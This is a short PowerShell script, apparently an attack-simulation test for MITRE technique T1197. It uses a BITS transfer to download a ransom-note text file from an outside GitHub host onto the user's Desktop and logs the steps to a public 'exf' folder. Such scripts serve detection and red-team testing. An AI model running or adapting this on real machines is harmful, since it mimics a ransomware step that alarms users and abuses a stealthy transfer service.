# Donwload Ransom Note and stores it on User's Desktop 
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload RansomWare Note using Bitsadmin (T1197)"
Write-Output "==============================================================================="
#
$exf_file = "$env:PUBLIC\exf\Note_setup.txt";
$DownLoadSource = "https://github.com/JimBenna/fakedocs/raw/refs/heads/main/Ransomware_note.txt"
$DestDir = "$env:USERPROFILE\Desktop\"
$DestFile = "Ransomware_note.txt"
$FullDest = $DestDir + $DestFile
try {
    Start-BitsTransfer -Source $DownLoadSource -Destination $FullDest -DisplayName "Donwload Text File" -Description "Downloadinging a text File From the Internet" -Priority Foreground
    Write-Output "Downloaded the file from the URL : $DownLoadSource" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
    Write-Output "File has been stored in : $FullDest" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
}
catch {
    Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append    
}